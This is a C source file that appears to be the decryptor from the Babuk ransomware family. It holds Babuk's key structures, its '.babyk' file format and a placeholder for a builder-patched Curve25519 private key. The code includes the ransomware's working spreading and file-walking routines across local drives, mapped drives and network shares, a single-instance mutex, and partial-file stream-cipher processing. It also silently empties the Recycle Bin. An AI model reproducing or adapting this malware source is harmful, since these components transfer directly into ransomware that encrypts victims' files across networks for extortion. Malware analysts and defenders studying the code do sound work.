#include <Windows.h>
#include <TlHelp32.h>
#include <RestartManager.h>
#include <Wbemprov.h>
#include <iphlpapi.h>
#include <icmpapi.h>
#include <lm.h>

#include "hash/crc32.h"
#include "hash/sha512.h"
#include "eSTREAM/ecrypt-sync.h"
#include "ecc/curve25519-donna.h"

#include "memory.h"
#include "queue.h"
#include "args.h"

#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "netapi32.lib")
#pragma comment(lib, "wbemuuid.lib")
#pragma comment(lib, "rstrtmgr.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "mpr.lib")

#pragma comment(linker, "/ENTRY:entry")
#pragma comment(linker, "/MERGE:.rdata=.text")

#define NOTE_FILE_NAME L"How To Restore Your Files.txt"

static const WCHAR* black[] = { L"Windows", L"Windows.old", L"Tor Browser", L"Internet Explorer", L"Google", L"Opera", L"Opera Software", L"Mozilla", L"Mozilla Firefox", L"$Recycle.Bin", L"ProgramData", L"All Users", L"autorun.inf", L"boot.ini", L"bootfont.bin", L"bootsect.bak", L"bootmgr", L"bootmgr.efi", L"bootmgfw.efi", L"desktop.ini", L"iconcache.db", L"ntldr", L"ntuser.dat", L"ntuser.dat.log", L"ntuser.ini", L"thumbs.db", L"ecdh_pub_k.bin", L"Program Files", L"Program Files (x86)", L"..", L"." };

static BYTE m_priv[32] = {
        'c', 'u', 'r', 'v', 'p', 'a', 't', 't', 'e', 'r', 'n', 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

#define VERSION_MUTEX "DoYouWantToHaveSexWithCoungDong"

#define CONST_BLOCK_PLUS 0x100000
#define CONST_BLOCK_MINUS -CONST_BLOCK_PLUS

#define CONST_LARGE_FILE 0x1400000
#define CONST_MEDIUM_FILE 0x500000

struct BABUK_KEYS {
    BYTE                 enc_key[32];
    BYTE                 enc_vec[32];
};

struct BABUK_FILEMETA {
    BYTE          curve25519_pub[32];
    DWORD                xcrc32_hash;
    LONGLONG                   flag1;
    LONGLONG                   flag2;
    LONGLONG                   flag3;
    LONGLONG                   flag4;
};

void _decrypt_file(WCHAR* filePath) {
    LARGE_INTEGER fileSize;
    LARGE_INTEGER fileOffset;
    LARGE_INTEGER fileChunks;



    if (WCHAR* newName = (WCHAR*)_halloc(32768 * sizeof(WCHAR))) {
        lstrcpyW(newName, filePath);
        (newName + (lstrlenW(filePath) - 6))[0] = L'\0';
        MoveFileExW(filePath, newName, MOVEFILE_WRITE_THROUGH | MOVEFILE_REPLACE_EXISTING);

        fileOffset.QuadPart = 0;
        HANDLE hFile = CreateFileW(newName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
        _hfree(newName);

        DWORD dwRead;
        DWORD dwWrite;

        BABUK_KEYS babuk_keys;
        BABUK_FILEMETA babuk_meta;

        ECRYPT_ctx ctx;

        if (hFile != INVALID_HANDLE_VALUE) {
        rescan:;
            BYTE dhsc[32];
            GetFileSizeEx(hFile, &fileSize);
            if (fileSize.QuadPart > (LONGLONG)sizeof(BABUK_FILEMETA)) {
                if (BYTE* ioBuffer = (BYTE*)_halloc(CONST_BLOCK_PLUS)) {
                    fileOffset.QuadPart = fileSize.QuadPart - sizeof(BABUK_FILEMETA);
                    SetFilePointerEx(hFile, fileOffset, 0, FILE_BEGIN);
                    ReadFile(hFile, (BYTE*)&babuk_meta, sizeof(BABUK_FILEMETA), &dwRead, 0);

                    if (
                        babuk_meta.flag1 == 0x6420676e756f6863 && babuk_meta.flag2 == 0x6b6f6f6c20676e6f &&
                        babuk_meta.flag3 == 0x6820656b696c2073 && babuk_meta.flag4 == 0x2121676f6420746f
                        ) {
                        fileSize.QuadPart -= sizeof(BABUK_FILEMETA);

                        curve25519_donna(dhsc, (u8*)m_priv, babuk_meta.curve25519_pub);
                        SHA512_Simple(dhsc, 32, (BYTE*)&babuk_keys);
                        if (babuk_meta.xcrc32_hash == xcrc32((BYTE*)&babuk_keys, sizeof(BABUK_KEYS))) {
                            SetFilePointerEx(hFile, fileOffset, 0, FILE_BEGIN);
                            SetEndOfFile(hFile);

                            ECRYPT_keysetup(&ctx, babuk_keys.enc_key, 256, 256);
                            ECRYPT_ivsetup(&ctx, babuk_keys.enc_vec);

                            fileOffset.QuadPart = 0;
                            SetFilePointerEx(hFile, fileOffset, 0, FILE_BEGIN);
                            if (fileSize.QuadPart > CONST_LARGE_FILE) {
                                fileChunks.QuadPart = fileSize.QuadPart / 0xA00000i64;
                                for (LONGLONG i = 0; i < fileChunks.QuadPart; i++) {
                                    ReadFile(hFile, ioBuffer, CONST_BLOCK_PLUS, &dwRead, 0);
                                    ECRYPT_process_bytes(0, &ctx, ioBuffer, ioBuffer, dwRead);
                                    SetFilePointerEx(hFile, fileOffset, 0, FILE_BEGIN);
                                    WriteFile(hFile, ioBuffer, CONST_BLOCK_PLUS, &dwWrite, 0);

                                    fileOffset.QuadPart += 0xA00000i64;
                                    SetFilePointerEx(hFile, fileOffset, 0, FILE_BEGIN);
                                }
                            }
                            else if (fileSize.QuadPart > CONST_MEDIUM_FILE) {
                                LONGLONG jump = fileSize.QuadPart / 3;

                                for (LONGLONG i = 0; i < 3; i++) {
                                    ReadFile(hFile, ioBuffer, CONST_BLOCK_PLUS, &dwRead, 0);
                                    ECRYPT_process_bytes(0, &ctx, ioBuffer, ioBuffer, dwRead);
                                    SetFilePointerEx(hFile, fileOffset, 0, FILE_BEGIN);
                                    WriteFile(hFile, ioBuffer, dwRead, &dwWrite, 0);

                                    fileOffset.QuadPart += jump;
                                    SetFilePointerEx(hFile, fileOffset, 0, FILE_BEGIN);
                                }
                            }
                            else if (fileSize.QuadPart > 0) {
                                LONGLONG block_size = fileSize.QuadPart > 64 ? fileSize.QuadPart / 10 : fileSize.QuadPart;

                                ReadFile(hFile, ioBuffer, block_size, &dwRead, 0);
                                ECRYPT_process_bytes(0, &ctx, ioBuffer, ioBuffer, dwRead);
                                SetFilePointerEx(hFile, fileOffset, 0, FILE_BEGIN);
                                WriteFile(hFile, ioBuffer, dwRead, &dwWrite, 0);
                            }

                            goto rescan;
                        }
                        else {
                            MessageBoxW(0, filePath, L"Key broken!", 0);
                        }
                    }
                    _hfree(ioBuffer);
                }
            }
            CloseHandle(hFile);
        }
    }
}

DWORD WINAPI lilBabuk(LPVOID lpData) {
    while (WCHAR* file = _que_pop()) {
        _decrypt_file(file);
        _hfree(file);
    }
    ExitThread(0);
}

void find_files_recursive(LPCWSTR dirPath)
{
    DWORD dwO;
    if (WCHAR* localDir = (WCHAR*)_halloc(32768 * sizeof(WCHAR)))
    {
        WIN32_FIND_DATAW fd;
        lstrcpyW(localDir, dirPath);
        lstrcatW(localDir, L"\\*");
        HANDLE hIter = FindFirstFileW(localDir, &fd);
        if (hIter != INVALID_HANDLE_VALUE)
        {
            do
            {
                for (DWORD i = 0; i < _countof(black); ++i) {
                    if (!lstrcmpiW(fd.cFileName, black[i])) {
                        goto skip;
                    }
                }

                lstrcpyW(localDir, dirPath);
                lstrcatW(localDir, L"\\");
                lstrcatW(localDir, fd.cFileName);

                if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
                {
                    find_files_recursive(localDir);
                }
                else {
                    for (int i = lstrlenW(fd.cFileName) - 1; i >= 0; i--) {
                        if (fd.cFileName[i] == L'.') {
                            if (lstrcmpiW(fd.cFileName + i, L".babyk") == 0) {
                                _que_push(localDir);
                            }
                            else goto skip;
                        }
                    }
                }
            skip:;
            } while (FindNextFileW(hIter, &fd));
            FindClose(hIter);
            lstrcpyW(localDir, dirPath);
            lstrcatW(localDir, L"\\" NOTE_FILE_NAME);

            DeleteFileW(localDir);
        }
        _hfree(localDir);
    }
}

void find_files_network(LPNETRESOURCEW netRes)
{
    HANDLE hEnum;
    DWORD dwEntries = -1;
    DWORD cbBuffer = 1024 * 16;
    if (WNetOpenEnumW(RESOURCE_GLOBALNET, RESOURCETYPE_ANY, RESOURCEUSAGE_ALL, netRes, &hEnum) == NO_ERROR)
    {
        if (netRes = (LPNETRESOURCEW)_halloc(cbBuffer))
        {
            while (WNetEnumResourceW(hEnum, &dwEntries, netRes, &cbBuffer) == NO_ERROR)
            {
                for (DWORD i = 0; i < dwEntries; ++i)
                {
                    if ((netRes[i].dwUsage & RESOURCEUSAGE_CONTAINER) == RESOURCEUSAGE_CONTAINER) 
                        find_files_network(&netRes[i]);
                    else {
                        find_files_recursive(netRes[i].lpRemoteName);
                    }
                }
            }
            _hfree(netRes);
        }
        WNetCloseEnum(hEnum);
    }
}

void enum_shares(LPCWSTR addr) {
    PSHARE_INFO_1 BufPtr, p;
    NET_API_STATUS res;
    DWORD er = 0, tr = 0, resume = 0, i;
    WCHAR unc[100];

    do
    {
        res = NetShareEnum((LPWSTR)addr, 1, (LPBYTE*)&BufPtr, MAX_PREFERRED_LENGTH, &er, &tr, &resume);
        if (res == ERROR_SUCCESS || res == ERROR_MORE_DATA)
        {
            p = BufPtr;
            for (i = 1; i <= er; i++)
            {
                if (p->shi1_type == STYPE_DISKTREE || p->shi1_type == STYPE_SPECIAL) {
                    if (lstrlenW(p->shi1_netname) > 2 && lstrcmpW(p->shi1_netname, L"ADMIN$") != 0) {
                        lstrcpyW(unc, L"\\\\");
                        lstrcatW(unc, addr);
                        lstrcatW(unc, L"\\");
                        lstrcatW(unc, p->shi1_netname);
                        find_files_recursive(unc);
                    }
                }
                p++;
            }
            NetApiBufferFree(BufPtr);
        }
    } while (res == ERROR_MORE_DATA);
}

void entry() {
    MessageBoxA(0, "Press 'OK' to start decryption process!", 0, 0);
    int argc = 0;
    LPWSTR* argv = CommandLineToArgvW(GetCommandLineW(), &argc);

    HANDLE hMutex = OpenMutexA(MUTEX_ALL_ACCESS, 0, VERSION_MUTEX);
    if (!hMutex) hMutex = CreateMutexA(0, 0, VERSION_MUTEX);
    else ExitProcess(0);

    SetProcessShutdownParameters(0, 0);

    _mem_initialize();
    ECRYPT_init();

    if (WCHAR* testfile = argz_value(argc, argv, L"testfile")) {
        _decrypt_file(testfile);
        ExitProcess(0);
    }

    SHEmptyRecycleBinA(0, 0, SHERB_NOCONFIRMATION | SHERB_NOPROGRESSUI | SHERB_NOSOUND);

    SYSTEM_INFO lcSysInfo;
    GetSystemInfo(&lcSysInfo);
    DWORD dwThreads = lcSysInfo.dwNumberOfProcessors * 2;
    _que_initialize(lcSysInfo.dwNumberOfProcessors * 3);

    WCHAR* lanPos = argz_value(argc, argv, L"lan");
    LPNETRESOURCEW lpRes = 0;
    if (HANDLE* hThreads = (HANDLE*)_halloc(dwThreads * sizeof(HANDLE))) {
        for (int i = 0; i < dwThreads; i++) {
            hThreads[i] = CreateThread(0, 0, lilBabuk, 0, 0, 0);
        }

        if (WCHAR* shares = argz_value(argc, argv, L"shares")) {
            int count = 1;
            int len = lstrlenW(shares);
            for (int i = 0; i < len; i++) {
                if (shares[i] == L',') {
                    shares[i] = L'\0';
                    count++;
                }
            }
            do {
                WCHAR* share = (WCHAR*)_halloc(sizeof(WCHAR) * (lstrlenW(shares) + 1));
                lstrcpyW(share, shares);
                enum_shares(share);
                _hfree(share);

                shares += lstrlenW(shares) + 1;
            } while (--count);
        }

        if (WCHAR* paths = argz_value(argc, argv, L"paths")) {
            int count = 1;
            int len = lstrlenW(paths);
            for (int i = 0; i < len; i++) {
                if (paths[i] == L',') {
                    paths[i] = L'\0';
                    count++;
                }
            }
            do {
                WCHAR* path = (WCHAR*)_halloc(sizeof(WCHAR) * (lstrlenW(paths) + 1));
                lstrcpyW(path, paths);
                find_files_recursive(path);
                _hfree(path);

                paths += lstrlenW(paths) + 1;
            } while (--count);
        }

        if (lstrcmpW(lanPos, L"before") == 0) {
            find_files_network(lpRes);
        }

        if (DWORD dwDrives = GetLogicalDrives()) {
            for (WCHAR disk = L'A'; disk <= L'Z'; ++disk)
            {
                if (dwDrives & 1)
                {
                    if (WCHAR* driveBuffer = (WCHAR*)_halloc(7 * sizeof(WCHAR))) {
                        lstrcpyW(driveBuffer, L"\\\\?\\");
                        lstrcpyW(driveBuffer + 5, L":");
                        driveBuffer[4] = disk;

                        if (DWORD driveType = GetDriveTypeW(driveBuffer)) {
                            if (driveType != DRIVE_CDROM) {
                                if (driveType != DRIVE_REMOTE) {
                                    find_files_recursive(driveBuffer);
                                }
                                else {
                                    DWORD remoteDrvSize = 260;
                                    if (WCHAR* remoteDrv = (WCHAR*)_halloc(remoteDrvSize * sizeof(WCHAR)))
                                    {
                                        if (WNetGetConnectionW(&driveBuffer[4], remoteDrv, &remoteDrvSize) == NO_ERROR) {
                                            find_files_recursive(remoteDrv);
                                            _hfree(remoteDrv);
                                        }
                                    }
                                }
                            }
                        }
                        _hfree(driveBuffer);
                    }
                }
                dwDrives >>= 1;
            }
        }

        if (lstrcmpW(lanPos, L"after") == 0 || lanPos == 0) {
            find_files_network(lpRes);
        }

        for (int i = 0; i < dwThreads; i++) {
            _que_push(0);
        }
        WaitForMultipleObjects(dwThreads, hThreads, TRUE, INFINITE);
        for (int i = 0; i < dwThreads; i++) {
            CloseHandle(hThreads[i]);
        }

        _hfree(hThreads);
    }

    MessageBoxA(0, "Your files decrypted, bye!", 0, 0);
    ExitProcess(0);
}